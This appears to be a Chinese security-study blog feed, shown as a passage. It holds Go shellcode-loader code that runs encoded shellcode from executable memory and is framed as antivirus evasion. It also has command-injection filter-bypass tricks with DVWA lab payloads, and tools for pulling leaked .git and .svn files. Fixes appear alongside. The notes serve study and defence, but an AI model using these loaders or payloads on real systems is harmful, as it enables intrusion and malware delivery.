RtlCopyMemory = ntdll.MustFindProc(<span class="string">"RtlCopyMemory"</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	xor_shellcode := []byte&#123;<span class="number">0x89</span>, <span class="number">0x3d</span>, <span class="number">0xf6</span>, <span class="number">0x91</span>, <span class="number">0x85</span>, <span class="number">0x9d</span>, <span class="number">0xb9</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x34</span>, <span class="number">0x24</span>, <span class="number">0x34</span>, <span class="number">0x25</span>, <span class="number">0x27</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x3d</span>, <span class="number">0x44</span>, <span class="number">0xa7</span>, <span class="number">0x10</span>, <span class="number">0x3d</span>, <span class="number">0xfe</span>, <span class="number">0x27</span>, <span class="number">0x15</span>, <span class="number">0x3d</span>, <span class="number">0xfe</span>...&#125;</span><br><span class="line"></span><br><span class="line">	addr, _, err := VirtualAlloc.Call(<span class="number">0</span>, <span class="built_in">uint</span>ptr(len(xor_shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line">	<span class="keyword">if</span> err != nil &amp;&amp; err.Error() != <span class="string">"The operation completed successfully."</span> &#123;</span><br><span class="line">		syscall.Exit(<span class="number">0</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	_, _, err = RtlCopyMemory.Call(addr, (<span class="built_in">uint</span>ptr)(unsafe.Pointer(&amp;xor_shellcode[<span class="number">0</span>])), <span class="built_in">uint</span>ptr(len(xor_shellcode)))</span><br><span class="line">	<span class="keyword">if</span> err != nil &amp;&amp; err.Error() != <span class="string">"The operation completed successfully."</span> &#123;</span><br><span class="line">		syscall.Exit(<span class="number">0</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实原理与上面python或者C/C++类似。</p>
<p>通过声明匿名函数,然后指向读入的ShellCode字节数据的那片内存，并将内存设置为可读可写可执行，之后调用函数就将ShellCode运行起来了。</p>
<h4 id="内联C加载"><a href="#内联C加载" class="headerlink" title="内联C加载"></a>内联C加载</h4><p>核心代码如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"C"</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">"unsafe"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    buf := <span class="string">""</span></span><br><span class="line">    buf += <span class="string">"xddxc6xd9x74x24xf4x5fx33xc9xb8xb3x5ex2c"</span></span><br><span class="line">    ...省略...</span><br><span class="line">    buf += <span class="string">"xc9xb1x97x31x47x1ax03x47x1ax83xc7x04xe2"</span></span><br><span class="line">    <span class="comment">// at your call site, you can send the shellcode directly to the C</span></span><br><span class="line">    <span class="comment">// function by converting it to a pointer of the correct type.</span></span><br><span class="line">    shellcode := []<span class="keyword">byte</span>(buf)</span><br><span class="line">    C.call((*C.char)(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​    shellcode既然是一段二进制代码，那加载器的功能其实就是想办法将二进制写到内存中，并将这段内存设置为可执行。在这个过程中，为了逃避杀软，所以要更多采用加密混淆等操作。</p>
]]></content>
  </entry>
  <entry>
    <title>命令执行/代码执行漏洞学习</title>
    <url>/2020/04/03/ming-ling-zhi-xing-dai-ma-zhi-xing-lou-dong-xue-xi/</url>
    <content><![CDATA[<h2 id="代码执行-命令执行漏洞学习笔记-靶场实战"><a href="#代码执行-命令执行漏洞学习笔记-靶场实战" class="headerlink" title="代码执行+命令执行漏洞学习笔记+靶场实战"></a>代码执行+命令执行漏洞学习笔记+靶场实战</h2><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><h4 id="一、什么是命令执行漏洞"><a href="#一、什么是命令执行漏洞" class="headerlink" title="一、什么是命令执行漏洞"></a>一、什么是命令执行漏洞</h4><h5 id="命令执行漏洞概念："><a href="#命令执行漏洞概念：" class="headerlink" title="命令执行漏洞概念："></a>命令执行漏洞概念：</h5><p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p>
<h5 id="漏洞危害："><a href="#漏洞危害：" class="headerlink" title="漏洞危害："></a>漏洞危害：</h5><ul>
<li>继承web服务器程序的权限，去执行系统命令。</li>
<li>继承web服务器程序的权限，读取文件</li>
<li>反弹shell</li>
<li>控制整个网站甚至控制整个服务器</li>
</ul>
<p><strong>代码层：</strong>一些商业应用需要执行命令，商业应用的一些核心代码可能封装在二进制文件中，在web应用中通过system函数来调用；</p>
<p><strong>系统层：</strong>（bash破壳漏洞）如果我们能够控制执行的bash的环境变量，就可以通过破壳漏洞来执行任意代码；</p>
<p><strong>第三方组件层：</strong>很典型的就是wordpress中，可以选择使用imageMagick这个常用的图片处理组件，对用户上传的图片进行处理，造成命令执行，另外java中的命令执行漏洞（struts2/Elasticsearch等）</p>
<p><strong>常用的Linux命令总结：</strong></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">ls cd mkdir rm cp mv touch cat more chmod <span class="builtin-name">find</span> vi du ifconfig<span class="built_in"> ping </span>netstat lsof shutdown uname kill<span class="built_in">..</span>.</span><br></pre></td></tr></table></figure>

<h5 id="命令执行与代码执行的区别："><a href="#命令执行与代码执行的区别：" class="headerlink" title="命令执行与代码执行的区别："></a>命令执行与代码执行的区别：</h5><p>代码执行是通过调用<strong>服务器网站代码</strong>进行执行，而命令注入则是调用<strong>操作系统命令</strong>进行执行。</p>
<h5 id="常见的命令执行函数："><a href="#常见的命令执行函数：" class="headerlink" title="常见的命令执行函数："></a>常见的命令执行函数：</h5><ul>
<li><p><strong>system()</strong></p>
<img src="/2020/04/03/ming-ling-zhi-xing-dai-ma-zhi-xing-lou-dong-xue-xi/QQ截图20200121111755.png" style="zoom: 67%;"> 



</li>
</ul>
<ul>
<li><p><strong>passthru()</strong></p>
<img src="/2020/04/03/ming-ling-zhi-xing-dai-ma-zhi-xing-lou-dong-xue-xi/QQ截图20200121111928.png" style="zoom: 67%;">



</li>
</ul>
<ul>
<li><strong>exec()</strong></li>
</ul>
  <img src="/2020/04/03/ming-ling-zhi-xing-dai-ma-zhi-xing-lou-dong-xue-xi/QQ截图20200121112035.png" style="zoom:67%;">



<ul>
<li><strong>shell_exec()</strong></li>
</ul>
  <img src="/2020/04/03/ming-ling-zhi-xing-dai-ma-zhi-xing-lou-dong-xue-xi/QQ截图20200121112153.png" style="zoom:67%;">



<ul>
<li><strong>`反引号</strong></li>
</ul>
  <img src="/2020/04/03/ming-ling-zhi-xing-dai-ma-zhi-xing-lou-dong-xue-xi/QQ截图20200121112345.png" style="zoom:67%;">



<ul>
<li><p><strong>ob_start()</strong></p>
</li>
<li><p><strong>popen()</strong></p>
</li>
<li><p><strong>proc_oprn()</strong></p>
</li>
<li><p>。。。</p>
</li>
</ul>
<h5 id="常见的绕过方法"><a href="#常见的绕过方法" class="headerlink" title="常见的绕过方法"></a>常见的绕过方法</h5><p><strong>1.空格过滤绕过</strong></p>
<p>空格可以用以下字符替换</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">&lt;    &lt;&gt;   %20(space)   %09(tab)  $IFS$9  $&#123;IFS&#125;  $IFS等</span><br></pre></td></tr></table></figure>

<p>  测试：</p>
<p><img src="/2020/04/03/ming-ling-zhi-xing-dai-ma-zhi-xing-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20200121121710.png" alt></p>
<p>2.<strong>命令分隔符</strong></p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">linux:%0a、%0d、;、&amp;、|、&amp;&amp;、||、</span><br><span class="line"><span class="keyword">window</span>: %0a、&amp;、|、%1a、</span><br></pre></td></tr></table></figure>

<img src="/2020/04/03/ming-ling-zhi-xing-dai-ma-zhi-xing-lou-dong-xue-xi/QQ截图20200121121840.png" style="zoom:67%;">

<p><strong>%0a符号：</strong>换行符                 <strong>%0d符号：</strong>回车符             <strong><code>;</code>符号：</strong>起连续指令的功能        </p>
<p><strong>&amp;  &amp;&amp; ||的区别</strong></p>
<p>（1）&amp; 表示先执行CMD1 再执行CMD2，这里不考虑CMD1是否成功。使用CMD1 &amp; CMD2</p>
<p>（2）&amp;&amp; 表示先执行CMD1，成功后再执行CMD，否则不执行CMD2。使用CMD1 &amp;&amp; CMD2</p>
<p>（3）|| 先执行CMD1，CMD1执行成功就不再执行CMD2，CMD1执行失败则执行CMD2。使用CMD1 || CMD2</p>
<p>3.<strong>敏感字符绕过</strong></p>
<ul>
<li><p>利用变量绕过</p>
<img src="/2020/04/03/ming-ling-zhi-xing-dai-ma-zhi-xing-lou-dong-xue-xi/QQ截图20200121122131.png" style="zoom:67%;">
</li>
<li><p>利用base64编码绕过</p>
<img src="/2020/04/03/ming-ling-zhi-xing-dai-ma-zhi-xing-lou-dong-xue-xi/QQ截图20200121122557.png" style="zoom:67%;">



</li>
</ul>
<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>1.能使用脚本解决的工作，不要调用其他程序处理，尽量少用执行命令的函数，并在disable_functions中禁用</p>
<ol start="2">
<li>在进入命令执行的函数或方法之前，对参数进行过滤。</li>
<li>参数的值尽量使用引号包裹，并在拼接前调用addslashes进行转义。</li>
</ol>
<h4 id="DVWA-命令注入部分"><a href="#DVWA-命令注入部分" class="headerlink" title="DVWA (命令注入部分)"></a>DVWA (命令注入部分)</h4><h5 id="simple"><a href="#simple" class="headerlink" title="simple"></a>simple</h5><p>由源码可知，要求我们输入ip地址，未进行任何过滤，我们在ip地址后使用&amp;&amp;拼接想要执行的命令。</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span>&amp;&amp;net user</span><br></pre></td></tr></table></figure>

<h5 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123; </span></span><br><span class="line"><span class="php">    <span class="comment">// Get input </span></span></span><br><span class="line"><span class="php">    $target = $_REQUEST[ <span class="string">'ip'</span> ]; </span></span><br><span class="line"><span class="php">    <span class="comment">// Set blacklist </span></span></span><br><span class="line"><span class="php">    $substitutions = <span class="keyword">array</span>( </span></span><br><span class="line"><span class="php">        <span class="string">'&amp;&amp;'</span> =&gt; <span class="string">''</span>, </span></span><br><span class="line"><span class="php">        <span class="string">';'</span>  =&gt; <span class="string">''</span>, </span></span><br><span class="line"><span class="php">    ); </span></span><br><span class="line"><span class="php">    <span class="comment">// Remove any of the charactars in the array (blacklist). </span></span></span><br><span class="line"><span class="php">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); </span></span><br><span class="line"><span class="php">    <span class="comment">// Determine OS and execute the ping command. </span></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123; </span></span><br><span class="line"><span class="php">        <span class="comment">// Windows </span></span></span><br><span class="line"><span class="php">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target ); </span></span><br><span class="line"><span class="php">    &#125; </span></span><br><span class="line"><span class="php">    <span class="keyword">else</span> &#123; </span></span><br><span class="line"><span class="php">        <span class="comment">// *nix </span></span></span><br><span class="line"><span class="php">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target ); </span></span><br><span class="line"><span class="php">    &#125; </span></span><br><span class="line"><span class="php">    <span class="comment">// Feedback for the end user </span></span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>; </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><strong>这里把&amp;&amp;过滤了。。但是我可以使用一个&amp;来绕过。。127.0.0.1&amp;net user</strong></p>
<p><strong>当然也可以使用 ||  |效果相同</strong></p>
<h5 id="high"><a href="#high" class="headerlink" title="high:"></a>high:</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123; </span></span><br><span class="line"><span class="php">    <span class="comment">// Get input </span></span></span><br><span class="line"><span class="php">    $target = trim($_REQUEST[ <span class="string">'ip'</span> ]); </span></span><br><span class="line"><span class="php">    <span class="comment">// Set blacklist </span></span></span><br><span class="line"><span class="php">    $substitutions = <span class="keyword">array</span>( </span></span><br><span class="line"><span class="php">        <span class="string">'&amp;'</span>  =&gt; <span class="string">''</span>, </span></span><br><span class="line"><span class="php">        <span class="string">';'</span>  =&gt; <span class="string">''</span>, </span></span><br><span class="line"><span class="php">        <span class="string">'|  '</span> =&gt; <span class="string">''</span>, </span></span><br><span class="line"><span class="php">        <span class="string">'-'</span>  =&gt; <span class="string">''</span>, </span></span><br><span class="line"><span class="php">        <span class="string">'$'</span>  =&gt; <span class="string">''</span>, </span></span><br><span class="line"><span class="php">        <span class="string">'('</span>  =&gt; <span class="string">''</span>, </span></span><br><span class="line"><span class="php">        <span class="string">')'</span>  =&gt; <span class="string">''</span>, </span></span><br><span class="line"><span class="php">        <span class="string">'`'</span>  =&gt; <span class="string">''</span>, </span></span><br><span class="line"><span class="php">        <span class="string">'||'</span> =&gt; <span class="string">''</span>, </span></span><br><span class="line"><span class="php">    ); </span></span><br><span class="line"><span class="php">    <span class="comment">// Remove any of the charactars in the array (blacklist). </span></span></span><br><span class="line"><span class="php">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); </span></span><br><span class="line"><span class="php">    <span class="comment">// Determine OS and execute the ping command. </span></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123; </span></span><br><span class="line"><span class="php">        <span class="comment">// Windows </span></span></span><br><span class="line"><span class="php">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target ); </span></span><br><span class="line"><span class="php">    &#125; </span></span><br><span class="line"><span class="php">    <span class="keyword">else</span> &#123; </span></span><br><span class="line"><span class="php">        <span class="comment">// *nix </span></span></span><br><span class="line"><span class="php">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target ); </span></span><br><span class="line"><span class="php">    &#125; </span></span><br><span class="line"><span class="php">    <span class="comment">// Feedback for the end user </span></span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>; </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>还是黑名单。。。，发现|符号还是可以使用   所以     <code>127.0.0.1| net user</code> 成功</p>
<h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><h5 id="什么是代码执行漏洞？"><a href="#什么是代码执行漏洞？" class="headerlink" title="什么是代码执行漏洞？"></a>什么是代码执行漏洞？</h5><p>   当应用在调用一些能够将字符转化为代码的函数（如PHP中的eval)时，没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞。</p>
<h5 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h5><p>PHP:eval()    assert()、  preg_replace() 、 call_user_func() 、  array_map() </p>
<p>Python:exec</p>
<p>asp：&lt;%=CreateObject(“wscript.shell”).exec(“cmd.exe /c ipconfig”).StdOut.ReadAll()%&gt;</p>
<h5 id="漏洞危害：-1"><a href="#漏洞危害：-1" class="headerlink" title="漏洞危害："></a>漏洞危害：</h5><ul>
<li>执行代码</li>
<li>让网站写shell</li>
<li>甚至控制服务器</li>
</ul>
<h5 id="常见种类"><a href="#常见种类" class="headerlink" title="常见种类"></a>常见种类</h5><ul>
<li>代码执行函数</li>
<li>文件包含代码注入</li>
<li>正则表达代码注入</li>
<li>动态代码执行</li>
<li>其他</li>
</ul>
<h5 id="漏洞分类："><a href="#漏洞分类：" class="headerlink" title="漏洞分类："></a>漏洞分类：</h5><p>执行代码的函数：eval、assert</p>
<p>callback函数：preg_replace + /e模式</p>
<p>反序列化：unserialize()反序列化</p>
<h5 id="示例一：php-eval代码执行"><a href="#示例一：php-eval代码执行" class="headerlink" title="示例一：php eval代码执行"></a>示例一：php eval代码执行</h5><p>本地新建test.php</p>
<img src="/2020/04/03/ming-ling-zhi-xing-dai-ma-zhi-xing-lou-dong-xue-xi/QQ截图20200124110825.png" style="zoom:67%;">

<p>我们本地网址执行phpinfo()</p>
<img src="/2020/04/03/ming-ling-zhi-xing-dai-ma-zhi-xing-lou-dong-xue-xi/QQ截图20200124111032.png" style="zoom:67%;">



<h5 id="示例二：-eval闭合代码执行"><a href="#示例二：-eval闭合代码执行" class="headerlink" title="示例二：  eval闭合代码执行"></a>示例二：  eval闭合代码执行</h5><img src="/2020/04/03/ming-ling-zhi-xing-dai-ma-zhi-xing-lou-dong-xue-xi/QQ截图20200124111354.png" style="zoom: 80%;">

<p><img src="/2020/04/03/ming-ling-zhi-xing-dai-ma-zhi-xing-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20200124111639.png" alt></p>
<h4 id="安全防御"><a href="#安全防御" class="headerlink" title="安全防御"></a>安全防御</h4><ol>
<li>尝试对所有输入提交可能执行命令的构造语句进行严格的检查或者控制外部输入，系统命令执行函数禁止外部传参</li>
<li>验证数据类型、格式、长度、范围和内容</li>
<li>客户端与服务端都需要做验证与过滤</li>
<li>对输出的数据也要做安全检查</li>
<li>在进入命令执行的函数或方法之前，对参数进行过滤</li>
<li>参数的值尽量使用引号包裹，并在拼接前调用addslashes进行转义</li>
<li>能使用脚本解决的工作，不要调用其他程序处理，尽量少用执行命令的函数，并在disabl_functions中禁用</li>
</ol>
<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.jianshu.com/p/f36e96955b87" target="_blank" rel="noopener">https://www.jianshu.com/p/f36e96955b87</a></p>
<p><a href="https://www.freebuf.com/column/154670.html" target="_blank" rel="noopener">https://www.freebuf.com/column/154670.html</a></p>
<p><a href="https://wh0ale.github.io/2018/12/01/2018-12-01-命令执行/" target="_blank" rel="noopener">https://wh0ale.github.io/2018/12/01/2018-12-01-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</a></p>
]]></content>
      <categories>
        <category>web漏洞学习</category>
      </categories>
      <tags>
        <tag>代码执行/命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>敏感信息泄露常见类型</title>
    <url>/2020/04/19/min-gan-xin-xi-xie-lu-chang-jian-lei-xing/</url>
    <content><![CDATA[<h2 id="敏感信息泄露-源码泄露-学习笔记"><a href="#敏感信息泄露-源码泄露-学习笔记" class="headerlink" title="敏感信息泄露/源码泄露  学习笔记"></a>敏感信息泄露/源码泄露  学习笔记</h2><h4 id="1-什么是敏感数据？"><a href="#1-什么是敏感数据？" class="headerlink" title="1.什么是敏感数据？"></a>1.什么是敏感数据？</h4><p>  敏感数据包括但不限于：口令、密钥、证书、会话标识、Licence、隐私数据、授权凭据、个人数据等、在程序文件、配置文件、日志文件、备份文件及数据库中都有可能包含敏感数据。</p>
<h4 id="1、-git文件泄露漏洞"><a href="#1、-git文件泄露漏洞" class="headerlink" title="1、.git文件泄露漏洞"></a>1、.git文件泄露漏洞</h4><p><strong>漏洞描述：</strong>git在初始化项目的时候，会在项目的根目录（git rev-parse  –show-toplevel查看）创建一个名为<code>.git</code>的隐藏文件夹，里面包含了本地所有commit的历史纪录，如果无意间将这个目录置于Web的路径下让用户可以访问，那么也就泄露了几乎所有的源代码和其他的敏感信息。可能泄露的内容：</p>
<ul>
<li>所有该项目的源码</li>
<li>私有仓库的地址</li>
<li>私密的配置信息。</li>
<li>所有commiter的邮箱账号信息</li>
<li>内部的账号和密码。。</li>
</ul>
<p><strong>检测方式：</strong>   工具：GitHack  使用方法：</p>
<p>​                 <code>python GitHack.py  http://网站地址/.git/</code></p>
<p><strong>示例：</strong>来源(i春秋web Hello world);</p>
<p>进入题目，查看源码，只发现一个js文件</p>
<img src="/2020/04/19/min-gan-xin-xi-xie-lu-chang-jian-lei-xing/QQ截图20200119121609.png" style="zoom:100%;">

<p>我们尝试使用Githack来判断网站是否有.git泄露。</p>
<p><img src="/2020/04/19/min-gan-xin-xi-xie-lu-chang-jian-lei-xing/QQ%E6%88%AA%E5%9B%BE20200119121109.png" alt></p>
<p>可见该网站下存在.git泄露，并且在工具文件夹下得到了泄露的文件内容。</p>
<img src="/2020/04/19/min-gan-xin-xi-xie-lu-chang-jian-lei-xing/QQ截图20200119121116.png" style="zoom:100%;">

<h4 id="2、-hg源码泄露漏洞"><a href="#2、-hg源码泄露漏洞" class="headerlink" title="2、.hg源码泄露漏洞"></a>2、.hg源码泄露漏洞</h4><p><strong>漏洞描述：</strong><a href="https://www.mercurial-scm.org/" target="_blank" rel="noopener">Mercurial</a>的意思是水银, 所以缩写成hg(汞), 也是一个版本管理软件. 用法和git有点类似, 但也保留了svn命令简明的特点, 而且原生地支持Windows/MacOS/Linux三大平台, 不像git需要MinGW才得以运行, 所以当今也有不少人偏向于用hg做版本控制.</p>
<p><strong>检测方式：</strong>工具dvcs-ripper,使用方法：<code>rip-hg.pl -v -u http://域名/.hg/</code></p>
<h4 id="3、DS-Store源码泄露漏洞"><a href="#3、DS-Store源码泄露漏洞" class="headerlink" title="3、DS_Store源码泄露漏洞"></a>3、DS_Store源码泄露漏洞</h4><p><strong>漏洞描述：</strong>在发布代码时，没有删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息，<a href="http://www.xxx.com/.ds_store" target="_blank" rel="noopener">http://www.xxx.com/.ds_store</a></p>
<p><strong>检测方式：</strong>dsstoreexp,使用方式：<code>python ds_store_exp.py http://域名/.Ds.store</code></p>
<h4 id="4、robots导致文件泄露"><a href="#4、robots导致文件泄露" class="headerlink" title="4、robots导致文件泄露"></a>4、robots导致文件泄露</h4><p><strong>漏洞描述：</strong>搜索引擎可以通过robots文件获知哪些页面可以爬取，哪些页面不可以爬取。Robots协议是网站国际互联网通行的道德规范。其目的是保护网站数据和明杆信息 、确保用户个人信息和隐私不被侵犯，如果robots.txt文件太过详细，反而会泄露网站的敏感目录或者文件，比如网站后台路径，从而得知其使用的系统类型，从而有针对性地进行利用。</p>
<p><strong>检测方式：</strong>1.我们可以直接使用御剑进行后台扫描，或者直接用爬虫进行爬取，从而找到robots.txt文件。</p>
<p>​                   2.直接在网站URL输入/robots.txt进行查看。</p>
<p><strong>修复方案：</strong>为了不让robots.txt中的内容不泄露网站的后台和隐私，我们可以使用星号（*）作为通配符进行设置。例如限制访问我们的后台admin目录，则规则为：</p>
<p>​       <img src="/2020/04/19/min-gan-xin-xi-xie-lu-chang-jian-lei-xing/QQ截图20200119110404.png" style="zoom: 100%;"></p>
<p>​             当我们又不想泄露我们的敏感目录时，我们可以使用星号(*)作为通配符即可。</p>
<img src="/2020/04/19/min-gan-xin-xi-xie-lu-chang-jian-lei-xing/QQ截图20200119110727.png" style="zoom:100%;">

<p>​                 </p>
<h4 id="5、备份文件泄露漏洞"><a href="#5、备份文件泄露漏洞" class="headerlink" title="5、备份文件泄露漏洞"></a>5、备份文件泄露漏洞</h4><p><strong>漏洞描述：</strong>备份文件泄露又分为两种情况, 一种是运维人员偷懒地直接在网站根目录用类似<code>tar -czvf    bakup.tgz</code>的命令将网站进行备份,<br> 这样整站的源代码都能直接被用户打包下载了； 另一种是开发或者运维人员使用的编辑器修改文件时自动备份了所编辑的网页内容,<br> 如vim的<code>.swp</code>, 从而泄露了该网页的源代码。<br><strong>检测方式：</strong>常见的备份文件后缀名：直接在URL中进行检测。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">*<span class="selector-class">.rar</span>    *<span class="selector-class">.zip</span>   *<span class="selector-class">.7z</span>   *<span class="selector-class">.tar</span><span class="selector-class">.gz</span>   *<span class="selector-class">.bak</span>   *<span class="selector-class">.swp</span>   *<span class="selector-class">.txt</span>   *<span class="selector-class">.html</span></span><br></pre></td></tr></table></figure>

<p>​                   或者使用工具比如AWVS进行扫描。</p>
<p><strong>修复方案：</strong>做好版本管理, 并利用版本管理工具过滤掉这些类型的文件, 同时不要直接在生产环境中修改或者添加文件</p>
<h4 id="6、phpinfo-）信息泄露漏洞"><a href="#6、phpinfo-）信息泄露漏洞" class="headerlink" title="6、phpinfo(）信息泄露漏洞"></a>6、phpinfo(）信息泄露漏洞</h4><p><strong>漏洞描述</strong>：Web站点的某些测试页面可能会使用到PHP的phpinfo()函数，会输出服务器的关键信息。</p>
<img src="/2020/04/19/min-gan-xin-xi-xie-lu-chang-jian-lei-xing/sec_hole_13.png" style="zoom:100%;">

<p><strong>检测方式 ：</strong>访问<a href="http://ip/phpinfo.php看是否成功。" target="_blank" rel="noopener">http://ip/phpinfo.php看是否成功。</a></p>
<p><strong>修复方案 ：</strong>删除该PHP文件。</p>
<h4 id="7、SVN文件泄露漏洞"><a href="#7、SVN文件泄露漏洞" class="headerlink" title="7、SVN文件泄露漏洞"></a>7、SVN文件泄露漏洞</h4><p><strong>漏洞描述：</strong>Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。</p>
<p><strong>漏洞检测：</strong> </p>
<p>1.漏洞利用工具： Seay SVN漏洞利用工具</p>
<p>2、添加网站url</p>
<p>在被利用的网址后面加 /.svn/entries，列出网站目录，甚至下载整站。</p>
<h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1.不要使用svn checkout和svn up更新服务器上的代码，使用svn export（导出）功能代替。</p>
<p>2.服务器软件（Nginx、apache、tomcat、IIS等）设置目录权限，禁止访问.svn目录</p>
<h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://ninjia.gitbook.io/secskill/web/info" target="_blank" rel="noopener">https://ninjia.gitbook.io/secskill/web/info</a></p>
<p><a href="https://blog.csdn.net/wy_97/article/details/78165051" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/78165051</a></p>
<p><a href="https://www.cnblogs.com/Hydraxx/p/10762512.html" target="_blank" rel="noopener">https://www.cnblogs.com/Hydraxx/p/10762512.html</a></p>
]]></content>
      <categories>
        <category>web漏洞学习</category>
      </categories>
      <tags>
        <tag>敏感信息泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞学习</title>
    <url>/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/</url>
    <content><![CDATA[<h1 id="文件上传漏洞学习笔记-靶场实战"><a href="#文件上传漏洞学习笔记-靶场实战" class="headerlink" title="文件上传漏洞学习笔记+靶场实战"></a>文件上传漏洞学习笔记+靶场实战</h1><h4 id="一-什么是文件上传漏洞"><a href="#一-什么是文件上传漏洞" class="headerlink" title="一.什么是文件上传漏洞"></a>一.什么是文件上传漏洞</h4><p>  文件上传<a href="http://www.2cto.com/" target="_blank" rel="noopener">漏洞</a>是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的.</p>
<p><strong>关于PHP中$_FILES数组的使用方法</strong></p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">$_FILES\[<span class="string">‘file’</span>][<span class="symbol">‘name’</span>] 客户端文件名称</span><br><span class="line"></span><br><span class="line">$_FILES\[<span class="string">‘file’</span>][<span class="symbol">‘type’</span>] 文件的MIME类型</span><br><span class="line"></span><br><span class="line">$_FILES\[<span class="string">‘file’</span>][<span class="symbol">‘size’</span>] 文件大小 单位字节</span><br><span class="line"></span><br><span class="line">$<span class="emphasis">_FILES\[‘file’][‘tmp_</span>name’] 文件被上传后在服务器端临时文件名，可以在php.ini中指定</span><br></pre></td></tr></table></figure>

<p>需要注意的是在文件上传结束后，默认的被储存在临时文件夹中，这时必须把他从临时目录中删除或移动到其他地方，否则，脚本运行完毕后，自动删除临时文件，可以使用copy或者<code>move_uploaded_file</code>两个函数</p>
<h5 id="文件上传中常见的函数错误"><a href="#文件上传中常见的函数错误" class="headerlink" title="文件上传中常见的函数错误"></a>文件上传中常见的函数错误</h5><p><strong>这些函数有:<code>empty()、isset()、strpos()、rename()</code>等，如下面的代码:</strong></p>
